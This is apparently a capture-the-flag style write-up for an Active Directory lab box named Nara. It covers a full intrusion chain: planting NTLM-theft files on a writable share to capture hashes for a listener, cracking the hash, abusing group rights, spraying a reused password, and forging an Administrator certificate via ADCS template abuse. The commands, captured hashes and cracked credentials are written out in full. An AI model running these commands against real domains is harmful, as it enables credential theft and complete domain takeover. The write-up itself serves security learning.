# Nara - Detailed 
## Initial Enumeration
### Port Scanning
A comprehensive port scan revealed several open ports typical of an Active Directory environment:
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
3389/tcp  open  ms-wbt-server
5985/tcp  open  http (WinRM)
9389/tcp  open  mc-nmf
```
### LDAP Enumeration
LDAP enumeration provided valuable domain information:
- Domain name: nara-security.com
- Domain controller: Nara.nara-security.com
- Certificate information showing valid certificates for the domain
```
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=nara-security,DC=com
ldapServiceName: nara-security.com:nara$@NARA-SECURITY.COM
```
### SMB Enumeration
Using tools like Enum4Linux and SMBMap, I discovered:
- NetBIOS domain name: NARASEC
- Domain SID: S-1-5-21-914744703-3800712539-3320214069
- OS Version: Windows Server 2019 (10.0.20348)
- SMB signing required
Initial SMB connection attempts failed with anonymous and null authentication. This suggested tight security controls were in place.
## Gaining Initial Access
### SMB Share Access
After some testing, I discovered a share named "nara" was accessible using guest authentication. The server treated invalid usernames as guest, allowing me to connect with:
```bash
smbclient \\\\$IP\\nara -U nara-security.com/root%123456
```
Inside the share, I found a note titled "Important.txt" indicating that files in the documents folder were shared and important for the organization.
### NTLM Theft
Leveraging the writable share, I generated NTLM theft payloads to capture authentication hashes:
```bash
python3 '/home/kali/Exploits/ntlm_theft-master/ntlm_theft.py' -g all -s 192.168.45.172 -f nara
```
I uploaded these payloads to the share:
```bash
smbclient \\\\$IP\\nara -U nara-security.com/root%123456
smb: \> mput *
```
This successfully captured an NTLMv2 hash for user Tracy.White:
```
Tracy.White::NARASEC:b057b9f94a9c64db:B0C11E29DA0A65BB9CA8E293AA169052:010100000000000000AF042D6C44DB0162A35B3B6BD974B8000000000200080051004C0034004E0001001E00570049004E002D0051004E0050004A0046005200520041004C004B004B0004003400570049004E002D0051004E0050004A0046005200520041004C004B004B002E0051004C0034004E002E004C004F00430041004C000300140051004C0034004E002E004C004F00430041004C000500140051004C0034004E002E004C004F00430041004C000700080000AF042D6C44DB0106000400020000000800300030000000000000000100000000200000047E57704F8419E0A167948403A511DC6AE0D52E7BFD6C42BFD2C9BE4836695B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370032000000000000000000
```
### Password Cracking
I used Hashcat to crack the captured NTLMv2 hash:
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
This yielded the following credentials:
- **Username**: TRACY.WHITE
- **Password**: zqwj041FGX
## Lateral Movement
### Enumerating User Privileges
After obtaining valid credentials, I conducted further enumeration of the Active Directory environment using BloodHound. The analysis revealed that the user `tracy.white` had `GenericAll` privilege over the `Remote Access` group.
### Exploiting Group Membership
This privilege allowed me to add Tracy to the "Remote Access" group, enabling WinRM access:
```bash
net rpc group addmem "REMOTE ACCESS" "tracy.white" -U "nara-security.com"/"tracy.white"%"zqwj041FGX" -S "nara-security.com"
```
With Tracy now in the Remote Access group, I was able to establish a WinRM connection:
```bash
evil-winrm -i $IP -u tracy.white -p 'zqwj041FGX'
```
### Credential Discovery
Once logged in as Tracy, I found an interesting file containing an encrypted password:
```
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
```
I decrypted this secure string using PowerShell:
```powershell
$password = Get-Content hash.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
```
The decrypted password was: `hHO_S9gff7ehXw`
## Privilege Escalation
### User Enumeration
Using the newly discovered password, I attempted to identify other users who might be using the same password:
```bash
crackmapexec smb $IP -u users.txt -p 'hHO_S9gff7ehXw' --no-bruteforce --continue-on-success
```
This revealed that the user `Jodie.Summers` used the same password:
```
nara-security.com\Jodie.Summers:hHO_S9gff7ehXw
```
### Establishing Access as Jodie
I established a WinRM connection as Jodie:
```bash
evil-winrm -i $IP -u Jodie.Summers -p 'hHO_S9gff7ehXw'
```
### Certificate Abuse
BloodHound revealed that Jodie was part of the "Enrollment" group, which could potentially be used to exploit Active Directory Certificate Services.
I used Certipy to identify vulnerable certificate templates:
```bash
certipy-ad find -u Jodie.Summers -p 'hHO_S9gff7ehXw' -dc-ip $IP -stdout -vulnerable
```
This confirmed that the environment was vulnerable to certificate abuse. I requested a certificate for the Administrator account:
```bash
certipy-ad req -username "Jodie.Summers" -p "hHO_S9gff7ehXw" -template NaraUser -dc-ip $IP -ca NARA-CA -upn 'Administrator@nara-security.com' -dns Nara.nara-security.com -debug
```
This generated a PFX file that could be used for authentication.
### Domain Admin Access
Using the LDAP shell capability of Certipy, I leveraged the certificate to change the Administrator's password:
```bash
certipy-ad auth -ldap-shell -pfx administrator_nara.pfx -dc-ip $IP
```
In the LDAP shell, I changed the Administrator's password:
```
change_password Administrator Dolphin1
```
With the Administrator credentials now in hand, I had full domain admin access to the Nara domain controller.

